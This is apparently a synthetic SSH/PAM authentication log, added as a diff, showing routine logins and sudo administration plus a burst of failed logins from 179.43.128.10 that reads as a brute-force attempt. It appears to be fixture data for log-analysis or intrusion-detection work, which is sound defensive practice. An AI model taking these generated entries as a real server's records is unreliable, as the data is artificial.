+Jun 21 01:05:16 webserver pam_unix[23756]: Accepted password for priya from 14.139.123.45 port 49946 ssh2
+Jun 21 02:31:30 webserver sshd[39750]: Failed password for admin_ops from 117.55.34.78 port 62760 ssh2
+Jun 21 03:01:57 webserver sshd[44634]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=49.36.78.145  user=deploy
+Jun 21 03:07:46 webserver sshd[56671]: Failed password for priya from 122.161.45.67 port 50086 ssh2
+Jun 21 03:23:29 webserver pam_unix[38601]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Jun 21 04:24:50 webserver pam_unix[12104]: pam_unix(sshd:session): session closed for user devops
+Jun 21 04:29:37 webserver su[24314]: pam_unix(su:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=pts/1 ruser=ubuntu rhost=  user=root
+Jun 21 04:34:02 webserver sshd[19133]: Failed password for priya from 117.55.34.78 port 45552 ssh2
+Jun 21 07:55:19 webserver sshd[18402]: Failed password for devops from 103.21.244.10 port 51880 ssh2
+Jun 21 09:15:11 webserver sshd[25457]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=117.55.34.78  user=deploy
+Jun 21 09:17:21 webserver sshd[20434]: Failed password for ubuntu from 14.139.123.45 port 40203 ssh2
+Jun 21 09:38:53 webserver sshd[27384]: Disconnected from authenticating user deploy 14.139.123.45 port 54166
+Jun 21 12:48:56 webserver pam_unix[47995]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=117.55.34.78  user=devops
+Jun 21 13:13:45 webserver sshd[11388]: pam_unix(sshd:session): session closed for user priya
+Jun 21 13:41:07 webserver sshd[25198]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45  user=priya
+Jun 21 14:04:38 webserver sshd[49657]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=49.36.78.145  user=priya
+Jun 21 15:13:01 webserver sudo[13906]:  admin_ops : TTY=pts/1 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/systemctl restart postgresql
+Jun 21 15:14:54 webserver sshd[51424]: Failed password for devops from 117.55.34.78 port 57627 ssh2
+Jun 21 17:08:44 webserver passwd[53390]: pam_unix(passwd:chauthtok): password changed for john
+Jun 21 18:53:42 webserver sshd[57708]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Jun 21 20:07:20 webserver sudo[14955]: pam_unix(sudo:auth): authentication failure; logname=john uid=1000 euid=0 tty=pts/0 ruser=john rhost=  user=root
+Jun 21 20:53:51 webserver pam_unix[38747]: pam_unix(sshd:session): session closed for user devops
+Jun 21 20:55:03 webserver sshd[56964]: Accepted publickey for john from 115.240.89.12 port 41236 ssh2: RSA SHA256:dd52f6162ed582ba26514f22
+Jun 21 21:53:38 webserver sshd[34297]: pam_unix(sshd:session): session closed for user priya
+Jun 21 23:40:09 webserver sshd[37491]: Accepted password for devops from 115.240.89.12 port 55765 ssh2
+Jun 22 00:10:37 webserver sshd[22902]: Disconnected from authenticating user devops 122.161.45.67 port 58265
+Jun 22 03:49:59 webserver sshd[21065]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45  user=ubuntu
+Jun 22 04:20:29 webserver sshd[43186]: Disconnected from authenticating user john 115.240.89.12 port 56040
+Jun 22 05:11:01 webserver sshd[61171]: Accepted publickey for john from 49.36.78.145 port 63438 ssh2: RSA SHA256:cd9d0b4ef19ab754597d4b3c
+Jun 22 09:41:47 webserver sudo[58866]:  devops : TTY=pts/1 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/apt update
+Jun 22 10:17:42 webserver pam_unix[37435]: Accepted publickey for ubuntu from 103.21.244.10 port 45198 ssh2: RSA SHA256:8fa64e6c637e566177002bcf
+Jun 22 10:59:36 webserver sshd[32827]: Accepted password for devops from 117.55.34.78 port 63650 ssh2
+Jun 22 11:31:56 webserver su[23341]: Successful su for root by deploy
+Jun 22 13:30:34 webserver sshd[46846]: Accepted password for devops from 115.240.89.12 port 51293 ssh2
+Jun 22 17:47:24 webserver sshd[64501]: Accepted password for priya from 103.21.244.10 port 63480 ssh2
+Jun 22 17:51:16 webserver sshd[57148]: Accepted publickey for admin_ops from 103.21.244.10 port 52370 ssh2: RSA SHA256:6161369e3d3e5667d9727ef2
+Jun 22 19:03:49 webserver sudo[22146]: pam_unix(sudo:auth): authentication failure; logname=admin uid=1000 euid=0 tty=pts/0 ruser=admin rhost=  user=root
+Jun 22 21:01:15 webserver sshd[39356]: Disconnected from authenticating user deploy 115.240.89.12 port 45210
+Jun 22 21:27:07 webserver sshd[56450]: Accepted publickey for deploy from 14.139.123.45 port 56633 ssh2: RSA SHA256:16fd3e7806f4fc6e022a7f29
+Jun 22 23:00:31 webserver CRON[18503]: pam_unix(cron:session): session closed for user ubuntu
+Jun 23 00:03:26 webserver pam_unix[40709]: Disconnected from authenticating user admin_ops 117.55.34.78 port 44586
+Jun 23 00:11:11 webserver sshd[46101]: Accepted publickey for john from 115.240.89.12 port 62699 ssh2: RSA SHA256:8d8a5fed276bb3a3c5ffe1c1
+Jun 23 01:00:00 webserver sshd[37141]: Failed password for guest from 179.43.128.10 port 44571 ssh2
+Jun 23 01:00:01 webserver sshd[49624]: Failed password for devops from 179.43.128.10 port 44945 ssh2
+Jun 23 01:00:02 webserver sshd[36667]: Failed password for invalid user www-data from 179.43.128.10 port 58821 ssh2
+Jun 23 01:00:06 webserver sshd[57875]: Connection closed by invalid user john 179.43.128.10 port 63450 [preauth]
+Jun 23 01:00:08 webserver sshd[19459]: Failed password for deploy from 179.43.128.10 port 46527 ssh2
+Jun 23 01:00:09 webserver sshd[23665]: Failed password for invalid user test from 179.43.128.10 port 62938 ssh2
+Jun 23 01:00:13 webserver sshd[48916]: Failed password for invalid user git from 179.43.128.10 port 44918 ssh2
+Jun 23 01:00:14 webserver sshd[62369]: Failed password for oracle from 179.43.128.10 port 58639 ssh2
+Jun 23 01:00:18 webserver sshd[33100]: Failed password for deploy from 179.43.128.10 port 60742 ssh2
+Jun 23 01:00:18 webserver sshd[58904]: Failed password for invalid user oracle from 179.43.128.10 port 62831 ssh2
+Jun 23 01:00:20 webserver sshd[39706]: Failed password for postgres from 179.43.128.10 port 44360 ssh2
+Jun 23 01:00:21 webserver sshd[11317]: Failed password for invalid user backup from 179.43.128.10 port 58257 ssh2
+Jun 23 01:00:24 webserver sshd[34826]: Failed password for admin from 179.43.128.10 port 55617 ssh2
+Jun 23 01:00:24 webserver sshd[10312]: Failed password for test from 179.43.128.10 port 59354 ssh2
+Jun 23 01:00:29 webserver sshd[43105]: Failed password for admin_ops from 179.43.128.10 port 49969 ssh2
+Jun 23 01:00:30 webserver sshd[52571]: Failed password for invalid user admin from 179.43.128.10 port 53081 ssh2
+Jun 23 01:00:30 webserver sshd[25721]: Failed password for invalid user support from 179.43.128.10 port 64254 ssh2
+Jun 23 01:00:32 webserver sshd[36649]: Failed password for admin from 179.43.128.10 port 44360 ssh2
+Jun 23 01:00:32 webserver sshd[40552]: Failed password for deploy from 179.43.128.10 port 44833 ssh2
+Jun 23 01:00:33 webserver sshd[56288]: Failed password for priya from 179.43.128.10 port 45139 ssh2
+Jun 23 01:00:35 webserver sshd[32058]: Failed password for invalid user support from 179.43.128.10 port 48741 ssh2
+Jun 23 01:00:35 webserver sshd[11105]: Failed password for ubuntu from 179.43.128.10 port 45886 ssh2
+Jun 23 01:00:39 webserver sshd[13285]: Failed password for invalid user nagios from 179.43.128.10 port 47651 ssh2
+Jun 23 01:00:39 webserver sshd[19951]: Failed password for priya from 179.43.128.10 port 59800 ssh2
+Jun 23 01:00:42 webserver sshd[21254]: Failed password for devops from 179.43.128.10 port 49400 ssh2
+Jun 23 01:00:44 webserver sshd[18568]: Failed password for invalid user root from 179.43.128.10 port 52002 ssh2
+Jun 23 01:00:44 webserver sshd[58802]: Failed password for invalid user user from 179.43.128.10 port 53285 ssh2
+Jun 23 01:00:48 webserver sshd[44492]: Failed password for invalid user postgres from 179.43.128.10 port 55056 ssh2
+Jun 23 01:00:51 webserver sshd[55912]: Failed password for devops from 179.43.128.10 port 55701 ssh2
+Jun 23 01:00:55 webserver sshd[43863]: Failed password for john from 179.43.128.10 port 56394 ssh2
+Jun 23 01:42:47 webserver sshd[57520]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=117.55.34.78  user=admin_ops
+Jun 23 03:24:01 webserver sudo[48696]:  priya : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod 600 /etc/ssl/private/server.key
+Jun 23 04:25:58 webserver sshd[45451]: Disconnected from authenticating user john 122.161.45.67 port 49667
+Jun 23 04:42:30 webserver sshd[29691]: Failed password for devops from 122.161.45.67 port 57122 ssh2
+Jun 23 06:51:46 webserver pam_unix[60499]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=122.161.45.67  user=admin_ops
+Jun 23 06:55:06 webserver pam_unix[60002]: Disconnected from authenticating user john 49.36.78.145 port 43746
+Jun 23 08:21:19 webserver sshd[42865]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+Jun 23 09:37:32 webserver pam_unix[35984]: Accepted publickey for devops from 14.139.123.45 port 57130 ssh2: RSA SHA256:ec1a2c98028f333f990539ee
+Jun 23 11:34:30 webserver pam_unix[36354]: Disconnected from authenticating user ubuntu 117.55.34.78 port 58185
+Jun 23 13:24:46 webserver sshd[33523]: Accepted password for deploy from 115.240.89.12 port 46307 ssh2
+Jun 23 13:51:50 webserver sshd[10114]: pam_unix(sshd:session): session opened for user john by (uid=0)
+Jun 23 14:09:58 webserver sudo[40046]:  priya : TTY=pts/0 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Jun 23 14:36:48 webserver passwd[57998]: pam_unix(passwd:chauthtok): password changed for john
+Jun 23 15:39:26 webserver sshd[52596]: Accepted publickey for priya from 49.36.78.145 port 54218 ssh2: RSA SHA256:adf4ba093245269ae15a54f3
+Jun 23 15:48:30 webserver sudo[30690]:  john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/pg_dump -U postgres mydb > /backups/mydb.sql
+Jun 23 16:21:32 webserver pam_unix[23074]: Accepted publickey for ubuntu from 14.139.123.45 port 43147 ssh2: RSA SHA256:1b159808e159d99047d43c24
+Jun 23 17:25:40 webserver sudo[19561]:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/certbot renew
+Jun 23 17:35:35 webserver sshd[12634]: Accepted password for priya from 115.240.89.12 port 43197 ssh2
+Jun 23 20:56:10 webserver sshd[15742]: pam_unix(sshd:session): session opened for user priya by (uid=0)
+Jun 23 22:04:55 webserver su[38262]: pam_unix(su:auth): authentication failure; logname=admin_ops uid=1000 euid=0 tty=pts/1 ruser=admin_ops rhost=  user=root
+Jun 23 22:41:07 webserver sudo[38546]:  devops : TTY=pts/2 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/docker restart api_container
+Jun 23 23:00:16 webserver sshd[16689]: Failed password for devops from 103.21.244.10 port 54422 ssh2
